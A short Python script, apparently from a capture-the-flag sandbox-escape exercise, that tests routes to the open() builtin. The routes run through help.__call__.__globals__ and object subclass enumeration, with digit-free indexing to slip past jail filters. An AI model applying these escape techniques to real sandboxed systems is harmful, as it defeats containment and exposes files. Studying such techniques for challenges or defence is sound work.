#!/usr/bin/env python3
"""
Test alternative payloads that might be shorter.

Ideas:
1. Use getattr with variables that already exist
2. Find shorter paths to open()
3. Use list comprehension tricks
"""

# Test what we can access without building strings
print("Testing accessible builtins...")
print("help available:", 'help' in dir())
print("dir available:", 'dir' in dir())
print("getattr available:", 'getattr' in dir())
print("chr available:", 'chr' in dir())
print("len available:", 'len' in dir())

# Check if we can access __builtins__ more directly
print("\nChecking __builtins__ access methods:")

# Method 1: via help (current method)
try:
    result = help.__call__.__globals__['__builtins__']['open']
    print("✓ help.__call__.__globals__['__builtins__']['open'] works")
except Exception as e:
    print(f"✗ help method failed: {e}")

# Method 2: via ().__class__
try:
    # Get object class
    obj_class = ().__class__
    # Get base object class  
    base = obj_class.__bases__[len([])]  # [0] but without using 0
    # Get subclasses - one of them will have __globals__
    subclasses = base.__subclasses__()
    print(f"✓ Found {len(subclasses)} subclasses via ().__class__.__bases__[0].__subclasses__()")
    
    # Find a class with useful attributes
    for i, cls in enumerate(subclasses):
        if hasattr(cls, '__init__') and hasattr(cls.__init__, '__globals__'):
            if 'open' in cls.__init__.__globals__.get('__builtins__', {}):
                print(f"  ✓ Class {i}: {cls.__name__} has open in __init__.__globals__")
                break
except Exception as e:
    print(f"✗ subclasses method failed: {e}")

# Method 3: Check if any other builtin has __globals__
print("\nChecking which builtins have __globals__:")
for name in ['help', 'dir', 'len', 'chr', 'getattr']:
    obj = eval(name)
    if hasattr(obj, '__call__'):
        if hasattr(obj.__call__, '__globals__'):
            print(f"✓ {name}.__call__.__globals__ exists")
